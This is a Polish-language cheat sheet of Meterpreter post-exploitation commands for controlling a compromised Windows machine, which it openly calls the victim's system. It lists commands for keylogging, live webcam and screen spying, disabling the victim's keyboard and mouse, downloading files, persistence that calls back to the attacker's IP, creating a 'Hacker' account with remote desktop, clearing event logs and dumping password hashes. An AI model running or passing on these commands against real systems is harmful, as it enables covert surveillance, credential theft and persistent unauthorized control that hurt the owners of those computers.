Wyświetlanie informacji o systemie: sysinfo
Przeglądanie dokumentów w systemie dir, ls itp…
Screenshot ekranu hosta: screenshot lub use espia a później screengrab
Oglądanie obrazu z hosta na żywo: screenshare
Oglądanie z kamerki na żywo: webcam_stream
Wyświetlenie wszystkich dostępnych pulpitów: enumdesktops
Przechwytywanie klawiszy: keyscan_start
Wyświetlenie przechwyconych klawiszy: keyscan_dump
Wyłączenie klawiatury/myszki: uictl disable keyboard / mouse
Wyświetlanie listy aktywnych procesów: TASKLIST
Zabijanie procesów: kill + nr PID np. kill 260
Podglądanie zawartości plików tekstowych na pulpicie: cat  plik.txt
Tworzenie nowych kanałów komunikacji: execute  -f notepad.exe -c
Kopiowanie plików w systemu ofiary: download + (nazwa pliku) np. Download plik.txt
Ściąganie wszelkich informacji z systemu ofiary: run winenum
Automatyczne tworzenie dostępu przy każdym uruchomieniu komputera ofiary: run persistence – A -S -U -I 60-p 4321 -r <ip atakującego>
Zmiana aktualnego katalogu: cd
Wyświetlanie w konsoli zawartości plików tekstowych: cat
Kasowanie plików: del
Tworzenie nowego konta: run getgui -u Hacker -p 1337
Tworzenie zdalnego sterowania: run getgui -e
Czyszczenie rejestru: clearev 
Wyświetlanie aktywnych sesji:  session -l
Pobieranie skrótów haseł: run post/windows/gather/hashdump